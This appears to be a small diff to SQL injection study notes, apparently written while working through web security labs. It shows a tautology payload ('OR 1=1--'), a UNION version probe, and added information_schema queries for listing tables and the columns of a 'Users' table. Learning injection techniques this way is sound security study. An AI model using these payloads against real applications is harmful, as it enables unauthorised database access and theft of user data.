@@ -149,8 +149,8 @@ SELECT * FROM products WHERE category = 'Gifts' OR 1=1-- AND released = 1
 `' UNION SELECT @@version--`
 
 __information_schema.tables__
-
-`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+`SELECT table_name, NULL FROM information_schema.tables`
+`SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'Users'`
 
 
 
